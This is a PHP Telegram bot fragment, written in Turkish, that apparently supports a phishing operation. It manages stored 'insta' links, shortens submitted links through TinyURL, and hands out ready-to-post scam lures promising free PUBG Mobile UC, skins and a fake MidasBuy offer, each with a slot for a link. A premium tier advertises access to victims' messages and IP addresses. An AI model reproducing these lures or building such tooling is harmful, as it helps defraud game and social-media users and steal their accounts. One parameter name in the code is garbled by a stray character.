array_map('unlink', array_filter((array) glob("insta/$id/*")));
unlink("database-links/$id/insta");
bot('sendmessage',[
'chat_id'=>$chat_id,
'text'=>
"📛 • link başarıyla silindi ✅
⁉️ • İşlem kodu - $result
",'reply_markup'=>json_encode(['keyboard'=>[

],'resize_keyboard'=>true])]);}

if($text == '🎋 • Premium Paketler , 🎠'){ 
bot('sendPhoto',[
'chat_id'=>$chat_id,
'photo'=>"https://t.me/DDH_I/72",
'caption'=>
"💣 • Hoşgeldin  $name ، 👾

🪐 ، Bu bölüm promosyon uzantıları içindir , 🎉

🎊 ، Aşağıdaki klavyeyi kullanarak bölümler arasında gezinebilirsiniz. , 👇
",
'parse_mode'=>"markdown",'disable_web_page_preview'=>true,
'reply_markup'=>json_encode(['keyboard'=>[
[['text'=>'🀄 • Promosyon Resimleri ، 🎋',],['text'=>'🎠 • Promosyon klişeleri ، 🎪',]],
[['text'=>'📂 • Instagram ، 🎮',],['text'=>'🔗 • Link Kısaltıcı ، 📡️',]],
],'resize_keyboard'=>true,
])
]);
}


if($text == '🔗 • Link Kısaltıcı ، 📡'){ 
bot('sendPhoto',[
'chat_id'=>$chat_id,
'photo'=>"https://t.me/DDH_I/77",
'caption'=>
"👨‍💻 • Kısaltmak için bağlantıyı şimdi gönderin ، 🦾
",
'parse_mode'=>"markdown",'disable_web_page_preview'=>true,
'reply_markup'=>json_encode(['keyboard'=>[

],'resize_keyboard'=>true,
])
]);
}


if($text !='🔗 • Link Kısaltıcı ، 📡'){
$short = file_get_contents("https://tinyurl.com/api-create.php?url=$text");
if($short != null){
bot('sendMessage',[
'chat_id'=>$chat_id,
'text'=>
"✅ • Bağlantı başarıyla kısaltıldı, 👋
➖➖➖➖➖➖➖➖➖➖
- 🔗 Orijinal bağlantı × 👇
$text
➖➖➖➖➖➖➖➖➖➖
- 🔗 Kısa bağlantı × 👇
$short
➖➖➖➖➖➖➖➖➖➖
",'parse_mode'=>"markdown",'disable_web_page_preview'=>true,
'reply_markup'=>json_encode(['keyboard'=>[

],'resize_keyboard'=>true,
])
]);
}
}





if($text == '🎠 • Promosyon klişeleri ، 🎪'){ 
bot('sendPhoto',[
'chat_id'=>$chat_id,
'photo'=>"https://t.me/DDH_I/71",
'caption'=>
"👋 • Hoşgeldin  $name , 💪

🎯 • Bu bölüm tanıtım klişelerine ayrılmıştır , 🎮

🎠 • Aşağıdaki klavyeden klişeleri seçin , 👇
",
'parse_mode'=>"markdown",'disable_web_page_preview'=>true,
'reply_markup'=>json_encode(['keyboard'=>[
[['text'=>'KalıpBasma 1 ، 🗿',],['text'=>'KalıpBasma 2 ، 🗿',]],
[['text'=>'KalıpBasma 3 ، 🗿',],['text'=>'KalıpBasma 4 ، 🗿',]],
],'resize_keyboard'=>true,
])
]);
}

if($text == 'KalıpBasma 1 ، 🗿'){ 
bot('sendMessage',[
'chat_id'=>$chat_id,
'text'=>
"Artık resmi web sitesinden MIDASBUY alabilirsiniz MidasBuy. 💣
UC 1500 + 375 çekebilirsiniz ve sadece bir kez çekebileceğinizi bilerek 1700 UC hesabınızda size ulaşacaktır. Ne duruyorsunuz... 🔥
şansını dene... 😱

• Bağlantıyı buraya koyا 🦅
",
'parse_mode'=>"markdown",'disable_web_page_preview'=>true,
'reply_markup'=>json_encode(['keyboard'=>[

],'resize_keyboard'=>true,
])
]);
}
if($text == 'KalıpBasma 2 ، 🗿'){ 
bot('sendMessage',[
'chat_id'=>$chat_id,
'text'=>
"Silahlarınızı son şekle yükseltebilirsiniz ⚡ Ve hesabınız en güçlü olacak ⭐ Dünyada 𝗣𝗨𝗕𝗚 𝗠𝗢𝗕𝗜𝗟𝗘 3850' UC elde edin ! 💴 Her gün hesabınızı geliştirin ve arkadaşlarınızdan daha iyi performans gösterin 🔥 Şimdi Alışveriş Yap 🛒'a tıklayarak satın alın MIDASBUY Ücretsiz ve efsanevi görünümler 👻 Şimdi deneyin 😱 ve sezonu elde edin ve hayallerinizi şimdi gerçekleştirin 💸💸💸
",
'parse_mode'=>"markdown",'disable_web_page_preview'=>true,
'reply_markup'=>json_encode(['keyboard'=>[

],'resize_keyboard'=>true,
])
]);
}
if($text == 'KalıpBasma 3 ، 🗿'){ 
bot('sendMessage',[
'chat_id'=>$chat_id,
'text'=>
"Şirket duyuruları PUBG MOBILE Bu sezon vesilesiyle değerli bir hediye sunarak PUBG MOBILE'ın tüm öğelerine kolayca sahip olabilirsiniz.

• M4 Joker'i ücretsiz edinin 
• Ücretsiz UC alın 8.100 - 24.000
• Ücretsiz bir nadir kıyafet seti alın
• Ücretsiz görünüm silahları alın M4
• Bedava Royale Pass Bu Sezon

• Bağlantıyı buraya koyا 🦅

Nasıl edinilir çok kolay aşağıdaki linke tıklayın
",
'parse_mode'=>"markdown",'disable_web_page_preview'=>true,
'reply_markup'=>json_encode(['keyboard'=>[

],'resize_keyboard'=>true,
])
]);
}
if($text == 'KalıpBasma 4 ، 🗿'){ 
bot('sendMessage',[
'chat_id'=>$chat_id,
'text'=>
"PUBG MOBİL HEDİYE, Ücretsiz Uc, Gun ve Free Skin🎁.

BAĞLANTIYI TIKLAYIN BURAYA ÜCRETSİZ UC EDİNİN👇

• Bağlantıyı buraya koyا 🦅

20 YORUMLAR 500 UC 💵
30 YORUMLAR 1000 UC💵
40 YORUMLAR 1500 UC💵
50 YORUMLAR 2000 UC💵
SHARE LINK 10000 UC💵

©2022 PUBG Corporation. All rights reversed. Privacy Policy | Tencent Games User Agreement
",
'parse_mode'=>"markdown",'disable_web_p�age_preview'=>true,
'reply_markup'=>json_encode(['keyboard'=>[

],'resize_keyboard'=>true,
])
]);
}

if($text == '🀄 • Promosyon Resimleri ، 🎋'){ 
bot('sendPhoto',[
'chat_id'=>$chat_id,
'photo'=>"https://t.me/DDH_I/70",
'caption'=>
"🏝️ ~ Merhaba  $name , 🎋

🎠 • Bu bölüm tanıtım fotoğrafları içindir ، 🏹

🪐 • Aşağıdaki klavyeden resimleri seçin ، 👇
",
'parse_mode'=>"markdown",'disable_web_page_preview'=>true,
'reply_markup'=>json_encode(['keyboard'=>[
[['text'=>'Resim 1 ، ⚜️',],['text'=>'Resim 2 ، ⚜️',]],
[['text'=>'Resim 3 ، ⚜️',],['text'=>'Resim 4 ، ⚜️',]],

],'resize_keyboard'=>true,
])
]);
}

if($text == 'Resim 1 ، ⚜️'){ 
bot('sendPhoto',[
'chat_id'=>$chat_id,
'photo'=>"https://t.me/DDH_I/57",
'caption'=>
"✅ • İndirme tamamlandı Resim sayı 1 ، ⚜️
",
'parse_mode'=>"markdown",'disable_web_page_preview'=>true,
'reply_markup'=>json_encode(['keyboard'=>[

],'resize_keyboard'=>true,
])
]);
}
if($text == 'Resim 2 ، ⚜️'){ 
bot('sendPhoto',[
'chat_id'=>$chat_id,
'photo'=>"https://t.me/DDH_I/58",
'caption'=>
"✅ • İndirme tamamlandı Resim sayı 2 ، ⚜️
",
'parse_mode'=>"markdown",'disable_web_page_preview'=>true,
'reply_markup'=>json_encode(['keyboard'=>[

],'resize_keyboard'=>true,
])
]);
}
if($text == 'Resim 3 ، ⚜️'){ 
bot('sendPhoto',[
'chat_id'=>$chat_id,
'photo'=>"https://t.me/DDH_I/59",
'caption'=>
"✅ • İndirme tamamlandı Resim sayı 3 ، ⚜️
",
'parse_mode'=>"markdown",'disable_web_page_preview'=>true,
'reply_markup'=>json_encode(['keyboard'=>[

],'resize_keyboard'=>true,
])
]);
}
if($text == 'Resim 4 ، ⚜️'){ 
bot('sendPhoto',[
'chat_id'=>$chat_id,
'photo'=>"https://t.me/DDH_I/60",
'caption'=>
"✅ • İndirme tamamlandı Resim sayı 4 ، ⚜️
",
'parse_mode'=>"markdown",'disable_web_page_preview'=>true,
'reply_markup'=>json_encode(['keyboard'=>[

],'resize_keyboard'=>true,
])
]);
}
if($text == '📂 • Instagram ، 🎮'){ 
bot('sendDocument',[
'chat_id'=>$chat_id,
'document'=>"https://t.me/DDH_I/65",
'caption'=>
"✅ • Instagram sürümü yüklendi X ، Biraz eski olabilir 🏜️
",
'parse_mode'=>"markdown",'disable_web_page_preview'=>true,
'reply_markup'=>json_encode(['keyboard'=>[

],'resize_keyboard'=>true,
])
]);
}
if($text == '/yapimci'){ 
bot('sendPhoto',[
'chat_id'=>$chat_id,
'photo'=>"https://t.me/libmsi/4",
'caption'=>
" API ve KAYNAK
~~~~~~~~~~~~~~~~~~~~~~~
‍💻 @DevUsta - Geliştirici
~~~~~~~~~~~~~~~~~~~~~~~
🥳 @CyberArsiv - Suponsor
~~~~~~~~~~~~~~~~~~~~~~~
📲 @Coorpex - Kanal
~~~~~~~~~~~~~~~~~~~~~~~
  🔥 Coorpex Community 🔥
~~~~~~~~~~~~~~~~~~~~~~~
",
'parse_mode'=>"markdown",'disable_web_page_preview'=>true,
'reply_markup'=>json_encode(['keyboard'=>[

],'resize_keyboard'=>true,
])
]);
}


if($text == '/netflix'){ 
bot('sendPhoto',[
'chat_id'=>$chat_id,
'photo'=>"https://t.me/libmsi/4",
'caption'=>
" Merhaba Hoşgeldin !
~~~~~~~~~~~~~~~~~~~~~~~
‍💻 Bugünün sorusu !
~~~~~~~~~~~~~~~~~~~~~~~
Atın yavrusuna ne denir ?
~~~~~~~~~~~~~~~~~~~~~~~
📲 Kısaca cevap veriniz !
~~~~~~~~~~~~~~~~~~~~~~~
  🔥 Coorpex Community 🔥
~~~~~~~~~~~~~~~~~~~~~~~
",
'parse_mode'=>"markdown",'disable_web_page_preview'=>true,
'reply_markup'=>json_encode(['keyboard'=>[

],'resize_keyboard'=>true,     
])    
]);
}


if($text == '/nasil_kullanirim'){ 
bot('sendPhoto',[
'chat_id'=>$chat_id,
'photo'=>"https://t.me/libmsi/4",
'caption'=>
" Yardım için herzaman buradayız
@coorpexbot u Botu kullanmayı bilmeyenler için

https://t.me/coorpex/89

hala yapamadıysanız 👇

@chivaslegalist
@Fazlaxl

Ulaşabilirsiniz...
",
'parse_mode'=>"markdown",'disable_web_page_preview'=>true,
'reply_markup'=>json_encode(['keyboard'=>[

],'resize_keyboard'=>true,
])
]);
}

if($text == '/buy'){ 
bot('sendPhoto',[
'chat_id'=>$chat_id,
'photo'=>"https://t.me/libmsi/4",
'caption'=>
"☕ Premium'a geçmek için 👇
➖➖➖➖➖➖➖➖➖➖➖➖➖
   👉  💲 @DevUsta 📲   👈
➖➖➖➖➖➖➖➖➖➖➖➖➖
👄 ÖZELLİKLER

🟢 ÖZEL BAĞLANTI
🟢 2X HIZLI
🟢 MESAJLARI GÖRME
🟢 IP ADRESİ

📡 Detaylar >> 
https://t.me/coorpex <\>
",
'parse_mode'=>"markdown",'disable_web_page_preview'=>true,
'reply_markup'=>json_encode(['keyboard'=>[

],'resize_keyboard'=>true,
])
]);
}
